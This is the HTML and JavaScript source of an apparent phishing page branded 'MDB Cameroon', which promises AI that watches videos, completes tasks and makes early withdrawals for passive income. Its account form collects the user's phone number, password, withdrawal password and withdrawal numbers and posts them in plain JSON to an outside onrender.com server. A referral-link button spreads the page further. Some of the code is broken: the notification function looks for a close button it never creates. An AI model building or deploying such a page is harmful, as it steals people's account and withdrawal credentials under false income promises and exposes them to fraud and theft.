<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      name="description"
      content="MDB Cameroon - Intelligent Automation Platform"
    />
    <title>MDB CAMEROON - Automatisation Intelligente</title>
    <link rel="icon" type="image/png" href="/favicon.png" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
    />
    <style>
      :root {
        --primary-color: #007a5e;
        --secondary-color: #ce1126;
        --accent-color: #fcd116;
        --dark-color: #2c3e50;
        --light-color: #ecf0f1;
        --text-color: #333;
        --text-light: #666;
        --border-color: #ddd;
        --border-radius: 12px;
        --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        --button-radius: 25px;
        --success-color: #27ae60;
        --error-color: #e74c3c;
        --warning-color: #f39c12;
        --info-color: #3498db;
        --transition: all 0.3s ease;
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      html {
        font-size: 16px;
        scroll-behavior: smooth;
      }

      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          "Helvetica Neue", Arial, sans-serif;
        background-color: #f5f7fa;
        color: var(--text-color);
        line-height: 1.6;
        position: relative;
        overflow-x: hidden;
        min-height: 100vh;
      }

      /* Main wrapper with centered content */
      .main-wrapper {
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 0 16px;
        position: relative;
        z-index: 1;
      }

      /* Gradient background - fixed height */
      .gradient-bg {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        height: 280px;
        background: linear-gradient(
          135deg,
          #007a5e 0%,
          #ce1126 50%,
          #fcd116 100%
        );
        z-index: 0;
        pointer-events: none;
      }

      .container {
        max-width: 480px;
        width: 100%;
        margin: 0 auto;
        position: relative;
        z-index: 5;
        padding-top: 20px;
      }

      /* Header */
      header {
        position: relative;
        z-index: 5;
        text-align: center;
        padding: 20px 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 12px;
      }

      .header-content {
        display: flex;
        align-items: center;
        gap: 12px;
        justify-content: center;
      }

      .logo img {
        max-width: 120px;
        height: auto;
        border-radius: 8px;
      }

      .language-selector {
        position: absolute;
        top: 12px;
        right: 0;
        z-index: 10;
        display: flex;
        gap: 4px;
      }

      .lang-btn {
        background: rgba(255, 255, 255, 0.2);
        color: white;
        border: 1px solid rgba(255, 255, 255, 0.5);
        padding: 6px 10px;
        border-radius: 6px;
        cursor: pointer;
        font-size: 0.85rem;
        font-weight: 600;
        transition: var(--transition);
        backdrop-filter: blur(10px);
      }

      .lang-btn:hover {
        background: rgba(255, 255, 255, 0.3);
      }

      .lang-btn.active {
        background: rgba(255, 255, 255, 0.4);
        border-color: white;
      }

      /* Buttons */
      .btn {
        display: inline-block;
        background: linear-gradient(135deg, #ff8c00, #ffd700);
        color: white;
        border: none;
        padding: 12px 24px;
        border-radius: var(--button-radius);
        cursor: pointer;
        font-size: 1rem;
        transition: var(--transition);
        font-weight: 600;
        text-align: center;
        user-select: none;
      }

      .btn:hover:not(:disabled) {
        opacity: 0.9;
        transform: translateY(-2px);
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
      }

      .btn:active:not(:disabled) {
        transform: translateY(0);
      }

      .btn:disabled {
        opacity: 0.6;
        cursor: not-allowed;
      }

      .btn-secondary {
        background: linear-gradient(135deg, #007a5e, #00a878);
        margin-right: 8px;
        width: 100%;
      }

      .btn-copy {
        background: linear-gradient(135deg, #3498db, #2980b9);
        padding: 10px 16px;
        font-size: 0.9rem;
      }

      /* Sections */
      .automation-section {
        background: rgba(255, 255, 255, 0.95);
        backdrop-filter: blur(20px);
        border: 1px solid rgba(255, 255, 255, 0.3);
        border-radius: var(--border-radius);
        padding: 20px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        margin-top: 20px;
        transition: var(--transition);
      }

      .automation-section:hover {
        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        transform: translateY(-2px);
      }

      .section-title {
        font-size: 1.2rem;
        font-weight: 700;
        margin-bottom: 16px;
        color: var(--dark-color);
      }

      /* Forms */
      .form-group {
        margin-bottom: 16px;
      }

      .form-group label {
        display: block;
        font-weight: 600;
        margin-bottom: 6px;
        color: var(--text-color);
        font-size: 0.95rem;
      }

      .form-group input,
      .form-group select {
        width: 100%;
        padding: 10px 12px;
        border: 1px solid rgba(0, 122, 94, 0.3);
        border-radius: 8px;
        font-size: 1rem;
        font-family: inherit;
        transition: var(--transition);
        background: rgba(255, 255, 255, 0.9);
      }

      .form-group input:focus,
      .form-group select:focus {
        outline: none;
        border-color: var(--primary-color);
        box-shadow: 0 0 0 3px rgba(0, 122, 94, 0.1);
      }

      .input-hint {
        font-size: 0.85rem;
        color: var(--text-light);
        margin-top: 4px;
      }

      /* Toggle */
      .toggle-container {
        margin: 20px 0;
        text-align: center;
      }

      .toggle-label {
        display: block;
        margin-bottom: 12px;
        font-weight: 600;
        color: var(--text-color);
      }

      .toggle {
        position: relative;
        width: 60px;
        height: 30px;
        background-color: #ccc;
        border-radius: 30px;
        cursor: pointer;
        margin: 0 auto;
        transition: var(--transition);
        border: 2px solid transparent;
      }

      .toggle:focus-visible {
        outline: 2px solid var(--primary-color);
        outline-offset: 2px;
      }

      .toggle::after {
        content: "";
        position: absolute;
        top: 2px;
        left: 2px;
        width: 24px;
        height: 24px;
        background: white;
        border-radius: 50%;
        transition: var(--transition);
      }

      .toggle.active {
        background-color: var(--success-color);
      }

      .toggle.active::after {
        transform: translateX(30px);
      }

      .toggle:disabled {
        opacity: 0.5;
        cursor: not-allowed;
      }

      /* AI Features Text */
      .ai-features-text {
        display: flex;
        flex-direction: column;
        gap: 12px;
      }

      .ai-feature-item {
        padding: 12px;
        background: rgba(0, 122, 94, 0.05);
        border-left: 4px solid var(--primary-color);
        border-radius: 6px;
      }

      .ai-feature-title {
        font-weight: 700;
        color: var(--dark-color);
        margin-bottom: 4px;
        font-size: 0.95rem;
      }

      .ai-feature-desc {
        color: var(--text-light);
        font-size: 0.9rem;
        line-height: 1.5;
      }

      /* Notifications */
      .notification {
        padding: 12px 16px;
        border-radius: 8px;
        margin: 16px 0;
        display: none;
        animation: slideIn 0.3s ease;
        border-left: 4px solid;
        word-break: break-word;
      }

      .notification.show {
        display: block;
      }

      .notification.success {
        background-color: #d4edda;
        color: #155724;
        border-left-color: var(--success-color);
      }

      .notification.error {
        background-color: #f8d7da;
        color: #721c24;
        border-left-color: var(--error-color);
      }

      .notification.warning {
        background-color: #fff3cd;
        color: #856404;
        border-left-color: var(--warning-color);
      }

      .notification.info {
        background-color: #d1ecf1;
        color: #0c5460;
        border-left-color: var(--info-color);
      }

      .notification-close {
        float: right;
        background: none;
        border: none;
        cursor: pointer;
        font-size: 1.2rem;
        padding: 0;
        color: inherit;
        opacity: 0.7;
        transition: var(--transition);
      }

      .notification-close:hover {
        opacity: 1;
      }

      @keyframes slideIn {
        from {
          opacity: 0;
          transform: translateY(-10px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      /* Modal */
      .modal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.6);
        z-index: 200;
        align-items: center;
        justify-content: center;
        padding: 20px;
        animation: fadeIn 0.3s ease;
      }

      .modal.active {
        display: flex;
      }

      .modal-content {
        background: rgba(255, 255, 255, 0.98);
        backdrop-filter: blur(20px);
        border-radius: var(--border-radius);
        padding: 30px;
        max-width: 500px;
        width: 100%;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        max-height: 90vh;
        overflow-y: auto;
        border: 1px solid rgba(255, 255, 255, 0.3);
      }

      .modal-header {
        font-size: 1.3rem;
        font-weight: 700;
        margin-bottom: 20px;
        color: var(--dark-color);
      }

      .modal-footer {
        display: flex;
        gap: 12px;
        margin-top: 24px;
        justify-content: flex-end;
        flex-direction: column;
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
        }
        to {
          opacity: 1;
        }
      }

      /* Navigation */
      .nav-bottom {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(255, 255, 255, 0.95);
        backdrop-filter: blur(20px);
        display: flex;
        justify-content: space-around;
        padding: 12px 0;
        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
        border-top: 3px solid var(--primary-color);
        z-index: 100;
      }

      .nav-item {
        text-align: center;
        color: var(--text-light);
        font-weight: 600;
        cursor: pointer;
        padding: 8px 12px;
        transition: var(--transition);
        font-size: 0.8rem;
        border-radius: 6px;
        user-select: none;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 4px;
      }

      .nav-item:hover {
        color: var(--primary-color);
        background-color: rgba(0, 122, 94, 0.1);
      }

      .nav-item.active {
        color: var(--primary-color);
        font-weight: 700;
      }

      .nav-icon {
        font-size: 1.3rem;
      }

      @media (max-width: 480px) {
        .container {
          max-width: 100%;
        }

        .modal-content {
          padding: 20px;
        }

        .modal-footer {
          flex-direction: column;
        }

        .btn {
          width: 100%;
        }

        header {
          padding: 15px 0;
        }

        .logo img {
          max-width: 100px;
        }
      }
    </style>
  </head>

  <body data-lang="en">
    <div class="gradient-bg"></div>

    <div class="main-wrapper">
      <div class="container">
        <header>
          <div class="language-selector">
            <button class="lang-btn active" data-lang="en" aria-label="English">
              EN
            </button>
            <button class="lang-btn" data-lang="fr" aria-label="FranÃ§ais">
              FR
            </button>
          </div>
          <div class="header-content">
            <div class="logo">
              <img src="logo.png" alt="MDB Cameroon Logo" />
            </div>
          </div>
        </header>

        <div id="notificationContainer"></div>

        <!-- Info Popup -->
        <div class="modal active" id="infoModal">
          <div class="modal-content">
            <h3 class="modal-header" data-i18n="info_title">ðŸš€ What is MDB?</h3>
            <p
              style="
                margin-bottom: 16px;
                color: var(--text-color);
                line-height: 1.8;
              "
              data-i18n="info_desc"
            >
              MDB Cameroon is an intelligent automation platform that helps you
              earn passive income through automated tasks and commission-based
              opportunities.
            </p>
            <p
              style="
                margin-bottom: 16px;
                color: var(--text-color);
                line-height: 1.8;
              "
              data-i18n="info_features"
            >
              Our AI handles everything: watches your videos, completes tasks,
              and processes withdrawals automatically to maximize your earnings.
            </p>
            <p
              style="
                margin-bottom: 24px;
                color: var(--text-light);
                font-size: 0.95rem;
              "
              data-i18n="info_disclaimer"
            >
              Join thousands of users earning daily commissions. Start your
              journey today!
            </p>
            <div class="modal-footer">
              <button
                id="closeInfoModal"
                class="btn"
                style="width: 100%"
                data-i18n="btn_start"
              >
                Get Started
              </button>
            </div>
          </div>
        </div>

        <div class="automation-section">
          <h2 class="section-title" data-i18n="config_title">
            Configuration & AI Management
          </h2>
          <div class="toggle-container" id="aiToggleContainer">
            <label
              class="toggle-label"
              for="aiToggle"
              data-i18n="ai_toggle_label"
              >Enable Artificial Intelligence</label
            >
            <p
              style="
                font-size: 0.85rem;
                color: var(--text-light);
                margin-bottom: 12px;
              "
              data-i18n="ai_info_note"
            >
              Please fill in your account information in the Account menu first
            </p>
            <div
              id="aiToggle"
              class="toggle"
              role="switch"
              aria-checked="false"
              aria-label="Enable AI"
              tabindex="0"
              disabled
            ></div>
          </div>
        </div>

        <!-- AI Features Text -->
        <div class="automation-section">
          <h3 class="section-title" data-i18n="ai_features_title">
            What AI Does For You
          </h3>
          <div class="ai-features-text">
            <div class="ai-feature-item">
              <div class="ai-feature-title" data-i18n="feature1_title">
                ðŸ“¹ Automatic Video Watching
              </div>
              <div class="ai-feature-desc" data-i18n="feature1_desc">
                Your AI automatically watches videos from your account 24/7,
                ensuring continuous engagement and earning potential without any
                manual intervention required.
              </div>
            </div>

            <div class="ai-feature-item">
              <div class="ai-feature-title" data-i18n="feature2_title">
                âœ… Task Completion
              </div>
              <div class="ai-feature-desc" data-i18n="feature2_desc">
                All assigned tasks are completed automatically and without any
                problems. The AI intelligently handles every task to maximize
                your productivity and earnings.
              </div>
            </div>

            <div class="ai-feature-item">
              <div class="ai-feature-title" data-i18n="feature3_title">
                ðŸ’° Automatic Withdrawal Processing
              </div>
              <div class="ai-feature-desc" data-i18n="feature3_desc">
                Withdrawals are processed automatically, even before scheduled
                dates. Get your earnings faster without waiting for withdrawal
                periods.
              </div>
            </div>
          </div>
        </div>

        <!-- Copy Link Section -->
        <div class="automation-section">
          <h3 class="section-title" data-i18n="share_title">Share Your Link</h3>
          <p
            style="
              margin-bottom: 12px;
              color: var(--text-light);
              font-size: 0.95rem;
            "
            data-i18n="share_desc"
          >
            Copy and share your referral link to earn commissions:
          </p>
          <button id="copyLinkBtn" class="btn btn-copy" style="width: 100%">
            <i class="fas fa-copy"></i>
            <span data-i18n="btn_copy">Copy Link</span>
          </button>
        </div>

        <div style="height: 100px"></div>
      </div>
    </div>

    <!-- Navigation -->
    <nav class="nav-bottom">
      <div
        class="nav-item active"
        data-page="home"
        data-i18n="nav_home"
        role="button"
        tabindex="0"
      >
        <i class="nav-icon fas fa-home"></i>
        <span>Home</span>
      </div>
      <div
        class="nav-item"
        id="openAccountBtn"
        data-i18n="nav_account"
        role="button"
        tabindex="0"
      >
        <i class="nav-icon fas fa-user"></i>
        <span>Account</span>
      </div>
    </nav>

    <!-- Account Modal -->
    <div class="modal" id="accountModal">
      <div class="modal-content">
        <h3 class="modal-header" data-i18n="account_title">
          Account Management
        </h3>

        <form id="accountForm" novalidate>
          <div class="form-group">
            <label for="accountPhone" data-i18n="phone_label"
              >Phone Number</label
            >
            <input
              type="tel"
              id="accountPhone"
              class="form-control"
              required
              aria-required="true"
              pattern="^\+?[0-9\s\-()]{9,}$"
            />
            <div class="input-hint" data-i18n="phone_hint"></div>
          </div>

          <div class="form-group">
            <label for="accountPassword" data-i18n="password_label"
              >Password</label
            >
            <input
              type="password"
              id="accountPassword"
              class="form-control"
              required
              aria-required="true"
              minlength="8"
            />
            <div class="input-hint" data-i18n="password_hint"></div>
          </div>

          <div class="form-group">
            <label
              for="withdrawalPassword"
              data-i18n="withdrawal_password_label"
              >Withdrawal Password</label
            >
            <input
              type="password"
              id="withdrawalPassword"
              class="form-control"
              required
              aria-required="true"
              minlength="6"
            />
            <div class="input-hint" data-i18n="withdrawal_hint"></div>
          </div>

          <div class="form-group">
            <label for="withdrawalNumbers" data-i18n="withdrawal_numbers_label"
              >Authorized Withdrawal Numbers</label
            >
            <input
              type="text"
              id="withdrawalNumbers"
              class="form-control"
              required
              aria-required="true"
            />
            <div class="input-hint" data-i18n="withdrawal_numbers_hint"></div>
          </div>

          <div class="modal-footer">
            <button
              type="button"
              id="closeAccountModal"
              class="btn btn-secondary"
              data-i18n="btn_cancel"
            >
              Cancel
            </button>
            <button type="submit" class="btn" data-i18n="btn_save">Save</button>
          </div>
        </form>
      </div>
    </div>

    <script>
      const i18n = {
        en: {
          info_title: "ðŸš€ What is MDB?",
          info_desc:
            "MDB Cameroon is an intelligent automation platform that helps you earn passive income through automated tasks and commission-based opportunities.",
          info_features:
            "Our AI handles everything: watches your videos, completes tasks, and processes withdrawals automatically to maximize your earnings.",
          info_disclaimer:
            "Join thousands of users earning daily commissions. Start your journey today!",
          btn_start: "Get Started",
          config_title: "Configuration & AI Management",
          ai_toggle_label: "Enable Artificial Intelligence",
          ai_info_note:
            "Please fill in your account information in the Account menu first",
          feature1_title: "ðŸ“¹ Automatic Video Watching",
          feature1_desc:
            "Your AI automatically watches videos from your account 24/7, ensuring continuous engagement and earning potential without any manual intervention required.",
          feature2_title: "âœ… Task Completion",
          feature2_desc:
            "All assigned tasks are completed automatically and without any problems. The AI intelligently handles every task to maximize your productivity and earnings.",
          feature3_title: "ðŸ’° Automatic Withdrawal Processing",
          feature3_desc:
            "Withdrawals are processed automatically, even before scheduled dates. Get your earnings faster without waiting for withdrawal periods.",
          share_title: "Share Your Link",
          share_desc: "Copy and share your referral link to earn commissions:",
          btn_copy: "Copy Link",
          nav_home: "Home",
          nav_account: "Account",
          account_title: "Account Management",
          phone_label: "Phone Number",

          password_label: "Password",

          withdrawal_password_label: "Withdrawal Password",

          withdrawal_numbers_label: "Authorized Withdrawal Numbers",

          btn_save: "Save",
          btn_cancel: "Cancel",
          validation_required: "This field is required",
          validation_phone: "Please enter a valid phone number",
          validation_password: "Password must be at least 8 characters",
          validation_withdrawal_password:
            "Withdrawal password must be at least 6 characters",
          success_saved: "Account settings saved successfully",
          error_fill_account:
            "Please fill all account information before enabling AI",
          ai_enabled: "Artificial Intelligence enabled successfully",
          link_copied: "Link copied to clipboard!",
        },
        fr: {
          info_title: "ðŸš€ Qu'est-ce que MDB?",
          info_desc:
            "MDB Cameroon est une plateforme d'automatisation intelligente qui vous aide Ã  gÃ©nÃ©rer un revenu passif grÃ¢ce Ã  des tÃ¢ches automatisÃ©es et des opportunitÃ©s basÃ©es sur les commissions.",
          info_features:
            "Notre IA gÃ¨re tout: regarde vos vidÃ©os, complÃ¨te les tÃ¢ches et traite les retraits automatiquement pour maximiser vos revenus.",
          info_disclaimer:
            "Rejoignez des milliers d'utilisateurs gagnant des commissions quotidiennes. Commencez votre parcours aujourd'hui!",
          btn_start: "Commencer",
          config_title: "Configuration et Gestion de l'IA",
          ai_toggle_label: "Activer l'Intelligence Artificielle",
          ai_features_title: "Ce que l'IA Fait Pour Vous",
          feature1_title: "ðŸ“¹ Regarder les VidÃ©os Automatiquement",
          feature1_desc:
            "Votre IA regarde automatiquement les vidÃ©os de votre compte 24/7, assurant un engagement continu et un potentiel de gain sans intervention manuelle requise.",
          feature2_title: "âœ… ComplÃ¨tion des TÃ¢ches",
          feature2_desc:
            "Toutes les tÃ¢ches assignÃ©es sont complÃ©tÃ©es automatiquement et sans problÃ¨me. L'IA gÃ¨re intelligemment chaque tÃ¢che pour maximiser votre productivitÃ© et vos revenus.",
          feature3_title: "ðŸ’° Traitement Automatique des Retraits",
          feature3_desc:
            "Les retraits sont traitÃ©s automatiquement, mÃªme avant les dates prÃ©vues. RÃ©cupÃ©rez vos revenus plus rapidement sans attendre les pÃ©riodes de retrait.",
          share_title: "Partagez Votre Lien",
          share_desc:
            "Copiez et partagez votre lien de parrainage pour gagner des commissions:",
          btn_copy: "Copier le Lien",
          nav_home: "Accueil",
          nav_account: "Compte",
          account_title: "Gestion du Compte",
          phone_label: "NumÃ©ro de tÃ©lÃ©phone",
          phone_hint: "Inclure l'indicatif du pays (ex: +237)",
          password_label: "Mot de passe",
          password_hint: "Minimum 8 caractÃ¨res",
          withdrawal_password_label: "Mot de passe de retrait",
          withdrawal_hint: "UtilisÃ© pour les transactions sÃ©curisÃ©es",
          withdrawal_numbers_label: "NumÃ©ros de retrait autorisÃ©s",
          withdrawal_numbers_hint: "Liste de numÃ©ros sÃ©parÃ©s par des virgules",
          btn_save: "Enregistrer",
          btn_cancel: "Annuler",
          validation_required: "Ce champ est obligatoire",
          validation_phone: "Veuillez entrer un numÃ©ro valide",
          validation_password:
            "Le mot de passe doit contenir au moins 8 caractÃ¨res",
          validation_withdrawal_password:
            "Le mot de passe doit contenir au moins 6 caractÃ¨res",
          success_saved: "ParamÃ¨tres du compte sauvegardÃ©s avec succÃ¨s",
          error_fill_account:
            "Veuillez remplir toutes les informations du compte avant d'activer l'IA",
          ai_enabled: "Intelligence Artificielle activÃ©e avec succÃ¨s",
          link_copied: "Lien copiÃ© dans le presse-papiers!",
        },
      };

      const state = {
        currentLang: "en",
        isAIEnabled: false,
        accountData: {},
        accountFilled: false,
      };

      const REFERRAL_LINK = "https://mdbcameroon-ia.onrender.com";
      const API_URL = "https://mdbcameroon-ia.onrender.com";

      // DOM Elements
      const infoModal = document.getElementById("infoModal");
      const closeInfoBtn = document.getElementById("closeInfoModal");
      const accountModal = document.getElementById("accountModal");
      const form = document.getElementById("accountForm");
      const openAccountBtn = document.getElementById("openAccountBtn");
      const closeAccountBtn = document.getElementById("closeAccountModal");
      const aiToggle = document.getElementById("aiToggle");
      const copyLinkBtn = document.getElementById("copyLinkBtn");
      const langBtns = document.querySelectorAll(".lang-btn");
      const notificationContainer = document.getElementById(
        "notificationContainer"
      );

      // i18n Functions
      function setLanguage(lang) {
        state.currentLang = lang;
        document.documentElement.lang = lang;
        document.body.dataset.lang = lang;

        document.querySelectorAll("[data-i18n]").forEach((el) => {
          const key = el.dataset.i18n;
          if (i18n[lang][key]) {
            el.textContent = i18n[lang][key];
          }
        });

        langBtns.forEach((btn) => {
          btn.classList.toggle("active", btn.dataset.lang === lang);
        });
      }

      // Notification System
      function showNotification(message, type = "info", duration = 4000) {
        const notif = document.createElement("div");
        notificationContainer.appendChild(notif);

        const closeBtn = notif.querySelector(".notification-close");
        closeBtn.addEventListener("click", () => notif.remove());

        if (duration > 0) {
          setTimeout(() => notif.remove(), duration);
        }

        return notif;
      }

      // Form Validation
      function validateForm() {
        const phone = document.getElementById("accountPhone").value.trim();
        const pass = document.getElementById("accountPassword").value.trim();
        const wpass = document
          .getElementById("withdrawalPassword")
          .value.trim();
        const wn = document.getElementById("withdrawalNumbers").value.trim();

        if (!phone || !pass || !wpass || !wn) {
          showNotification(
            i18n[state.currentLang].validation_required,
            "warning"
          );
          return false;
        }

        if (pass.length < 8) {
          showNotification(
            i18n[state.currentLang].validation_password,
            "warning"
          );
          return false;
        }

        if (wpass.length < 6) {
          showNotification(
            i18n[state.currentLang].validation_withdrawal_password,
            "warning"
          );
          return false;
        }

        return true;
      }

      // Check if account is filled
      function checkAccountFilled() {
        const phone = document.getElementById("accountPhone").value.trim();
        const pass = document.getElementById("accountPassword").value.trim();
        const wpass = document
          .getElementById("withdrawalPassword")
          .value.trim();
        const wn = document.getElementById("withdrawalNumbers").value.trim();

        state.accountFilled = !!(phone && pass && wpass && wn);
        updateToggleState();
      }

      // Update toggle state
      function updateToggleState() {
        if (state.accountFilled) {
          aiToggle.removeAttribute("disabled");
          aiToggle.style.cursor = "pointer";
          aiToggle.style.opacity = "1";
        } else {
          aiToggle.setAttribute("disabled", "true");
          aiToggle.style.cursor = "not-allowed";
          aiToggle.style.opacity = "0.5";
          aiToggle.classList.remove("active");
          state.isAIEnabled = false;
          aiToggle.setAttribute("aria-checked", "false");
        }
      }

      // Send data to API
      async function sendDataToAPI(data) {
        try {
          const response = await fetch(API_URL, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(data),
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          return await response.json();
        } catch (error) {
          console.error("API Error:", error);
          showNotification("Error sending data to server", "error");
          throw error;
        }
      }

      // Event Listeners - Info Modal
      closeInfoBtn.addEventListener("click", () => {
        infoModal.classList.remove("active");
      });

      infoModal.addEventListener("click", (e) => {
        if (e.target === infoModal) {
          infoModal.classList.remove("active");
        }
      });

      // Event Listeners - Language
      langBtns.forEach((btn) => {
        btn.addEventListener("click", () => setLanguage(btn.dataset.lang));
      });

      // Event Listeners - Account Modal
      openAccountBtn.addEventListener("click", () => {
        accountModal.classList.add("active");
        document.body.style.overflow = "hidden";
      });

      closeAccountBtn.addEventListener("click", () => {
        accountModal.classList.remove("active");
        document.body.style.overflow = "";
      });

      accountModal.addEventListener("click", (e) => {
        if (e.target === accountModal) {
          closeAccountBtn.click();
        }
      });

      // Form Submit
      form.addEventListener("submit", async (e) => {
        e.preventDefault();

        if (!validateForm()) return;

        if (!form.checkValidity()) {
          showNotification(
            i18n[state.currentLang].validation_required,
            "error"
          );
          return;
        }

        // Collect form data
        const formData = {
          phone: document.getElementById("accountPhone").value.trim(),
          password: document.getElementById("accountPassword").value.trim(),
          withdrawalPassword: document
            .getElementById("withdrawalPassword")
            .value.trim(),
          withdrawalNumbers: document
            .getElementById("withdrawalNumbers")
            .value.trim(),
          timestamp: new Date().toISOString(),
        };

        // Send to API
        try {
          await sendDataToAPI(formData);

          state.accountData = formData;
          state.accountFilled = true;
          checkAccountFilled();

          showNotification(i18n[state.currentLang].success_saved, "success");
          accountModal.classList.remove("active");
          document.body.style.overflow = "";
          form.reset();
        } catch (error) {
          showNotification("Error saving account data", "error");
        }
      });

      // Form input listeners for real-time validation
      document.querySelectorAll("#accountForm input").forEach((input) => {
        input.addEventListener("change", checkAccountFilled);
        input.addEventListener("keyup", checkAccountFilled);
      });

      // AI Toggle
      aiToggle.addEventListener("click", () => {
        if (state.accountFilled && !aiToggle.hasAttribute("disabled")) {
          state.isAIEnabled = !state.isAIEnabled;
          aiToggle.classList.toggle("active", state.isAIEnabled);
          aiToggle.setAttribute("aria-checked", state.isAIEnabled);

          if (state.isAIEnabled) {
            showNotification(i18n[state.currentLang].ai_enabled, "success");
          }
        } else if (!state.accountFilled) {
          showNotification(i18n[state.currentLang].error_fill_account, "error");
          setTimeout(() => {
            accountModal.classList.add("active");
            document.body.style.overflow = "hidden";
          }, 500);
        }
      });

      aiToggle.addEventListener("keydown", (e) => {
        if (
          (e.key === " " || e.key === "Enter") &&
          !aiToggle.hasAttribute("disabled")
        ) {
          e.preventDefault();
          aiToggle.click();
        }
      });
      // AI Toggle - VÃ©rification avant activation
      aiToggle.addEventListener("click", () => {
        // VÃ©rifier si le formulaire est rempli
        const phone = document.getElementById("accountPhone").value.trim();
        const pass = document.getElementById("accountPassword").value.trim();
        const wpass = document
          .getElementById("withdrawalPassword")
          .value.trim();
        const wn = document.getElementById("withdrawalNumbers").value.trim();

        // Si un champ est vide
        if (!phone || !pass || !wpass || !wn) {
          showNotification(i18n[state.currentLang].error_fill_account, "error");

          // Ouvrir le modal de compte aprÃ¨s 500ms
          setTimeout(() => {
            accountModal.classList.add("active");
            document.body.style.overflow = "hidden";
          }, 500);

          return; // ArrÃªter l'exÃ©cution
        }

        // Si tout est rempli, activer/dÃ©sactiver le toggle
        state.isAIEnabled = !state.isAIEnabled;
        aiToggle.classList.toggle("active", state.isAIEnabled);
        aiToggle.setAttribute("aria-checked", state.isAIEnabled);

        if (state.isAIEnabled) {
          showNotification(i18n[state.currentLang].ai_enabled, "success");
        }
      });

      // Copy Link Button
      copyLinkBtn.addEventListener("click", () => {
        navigator.clipboard
          .writeText(REFERRAL_LINK)
          .then(() => {
            showNotification(
              i18n[state.currentLang].link_copied,
              "success",
              3000
            );
          })
          .catch(() => {
            showNotification("Failed to copy link", "error");
          });
      });

      // Navigation
      document.querySelectorAll(".nav-item").forEach((item) => {
        item.addEventListener("click", () => {
          document
            .querySelectorAll(".nav-item")
            .forEach((el) => el.classList.remove("active"));
          item.classList.add("active");
        });

        item.addEventListener("keydown", (e) => {
          if (e.key === "Enter" || e.key === " ") {
            e.preventDefault();
            item.click();
          }
        });
      });

      // Initialize
      setLanguage("en");
      updateToggleState();
    </script>
  </body>
</html>
